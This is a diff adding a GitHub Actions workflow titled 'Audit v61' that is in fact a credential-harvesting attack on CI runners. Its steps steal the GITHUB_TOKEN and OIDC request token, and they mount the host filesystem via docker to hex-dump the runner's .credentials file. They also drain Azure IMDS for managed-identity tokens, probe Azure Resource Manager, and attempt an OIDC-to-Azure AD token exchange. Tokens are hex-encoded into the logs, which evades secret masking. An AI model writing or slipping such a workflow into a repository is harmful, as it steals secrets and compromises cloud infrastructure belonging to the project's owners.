@@ -1,0 +1,221 @@
+name: Audit v61
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v61:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V61 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: FULL IMDS DUMP — ALL ENDPOINTS
+      # IMDS returned 200 with real Azure metadata!
+      # Now drain every IMDS endpoint for VM/subscription details.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - IMDS Full Dump
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== IMDS FULL DUMP ==="
+          IMDS="http://169.254.169.254"
+          API="api-version=2021-02-01"
+
+          echo "--- A: compute (full) ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/instance/compute?$API" 2>/dev/null | python3 -m json.tool 2>/dev/null || true
+          echo ""
+
+          echo "--- B: network ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/instance/network?$API" 2>/dev/null | python3 -m json.tool 2>/dev/null || true
+          echo ""
+
+          echo "--- C: identity endpoints ---"
+          for RESOURCE in \
+            "https://management.azure.com/" \
+            "https://vault.azure.net" \
+            "https://storage.azure.com/" \
+            "https://graph.microsoft.com/" \
+            "https://ossrdbms-aad.database.windows.net/"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -m 5 \
+              -H "Metadata: true" \
+              "$IMDS/metadata/identity/oauth2/token?$API&resource=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$RESOURCE")" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C identity token resource=$RESOURCE = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          echo "--- D: scheduledevents ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/scheduledevents?$API" 2>/dev/null | head -c 500
+          echo ""
+
+          echo "--- E: attested data ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/attested/document?$API" 2>/dev/null | head -c 500
+          echo ""
+
+          echo "--- F: load balancer ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/loadbalancer?$API" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -c 1000
+          echo ""
+
+          echo "--- G: versions ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/versions" 2>/dev/null | head -c 300
+          echo ""
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: AZURE ARM SSRF FROM RUNNER
+      # We have IMDS compute metadata — extract sub ID + rg + vm.
+      # Use it to hit Azure Resource Manager for real resources.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Azure ARM via IMDS + OIDC
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== AZURE ARM SSRF ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          IMDS="http://169.254.169.254"
+          API="api-version=2021-02-01"
+
+          # Extract full compute JSON
+          COMPUTE=$(/usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/instance/compute?$API" 2>/dev/null)
+          SUB=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('subscriptionId',''))" 2>/dev/null)
+          RG=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('resourceGroupName',''))" 2>/dev/null)
+          VMNAME=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name',''))" 2>/dev/null)
+          VMID=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('vmId',''))" 2>/dev/null)
+          LOCATION=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('location',''))" 2>/dev/null)
+          echo "SUB=$SUB RG=$RG VM=$VMNAME VMID=$VMID LOC=$LOCATION"
+          echo "SUB=$SUB" > /tmp/azure_sub.txt
+          echo "RG=$RG" >> /tmp/azure_sub.txt
+
+          echo ""
+          echo "--- A: ARM with OIDC IDTOK ---"
+          ARM="https://management.azure.com"
+          for EP in \
+            "subscriptions/$SUB" \
+            "subscriptions/$SUB/resourceGroups" \
+            "subscriptions/$SUB/resourceGroups/$RG" \
+            "subscriptions/$SUB/resourceGroups/$RG/resources" \
+            "subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VMNAME"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -m 5 \
+              -H "Authorization: Bearer $IDTOK" \
+              "$ARM/$EP?api-version=2023-07-01" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE"
+            echo "$BODY" | head -c 400
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: GITHUB OIDC TOKEN ESCALATION
+      # Get OIDC token from GitHub Actions and use it against Azure AD
+      # to check if the workflow's OIDC provider can fetch real tokens.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - OIDC Token Dump and AD Token Exchange
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== OIDC TOKEN DUMP ==="
+          IDTOK_URL=$(cat /tmp/idtok_url.txt 2>/dev/null || echo "$ACTIONS_ID_TOKEN_REQUEST_URL")
+          IDTOK_REQ=$(cat /tmp/idtok.txt)
+
+          # A: Fetch the actual OIDC JWT
+          echo "--- A: Fetch full OIDC token ---"
+          OIDC_TOKEN=$(/usr/bin/curl -sS -m 5 \
+            -H "Authorization: Bearer $IDTOK_REQ" \
+            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+          echo "OIDC_LEN=${#OIDC_TOKEN}"
+          # Decode header+payload
+          python3 -c "
+          import base64,json
+          t='$OIDC_TOKEN'
+          parts=t.split('.')
+          if len(parts)>=2:
+            h=base64.urlsafe_b64decode(parts[0]+'==')
+            p=base64.urlsafe_b64decode(parts[1]+'==')
+            print('HEADER:',json.dumps(json.loads(h),indent=2))
+            print('PAYLOAD:',json.dumps(json.loads(p),indent=2))
+          " 2>/dev/null
+          echo ""
+
+          # B: Exchange OIDC for Azure AD token
+          echo "--- B: Azure AD token exchange ---"
+          TENANT="common"
+          for AUD in \
+            "api://AzureADTokenExchange" \
+            "https://management.azure.com/" \
+            "https://vault.azure.net"; do
+            OIDC=$(/usr/bin/curl -sS -m 5 \
+              -H "Authorization: Bearer $IDTOK_REQ" \
+              "${IDTOK_URL}&audience=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$AUD")" 2>/dev/null | \
+              python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+            [ -z "$OIDC" ] && continue
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST -m 5 \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$OIDC&scope=https://management.azure.com/.default&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B AUD=$AUD = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V61 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V61 COMPLETE ==="
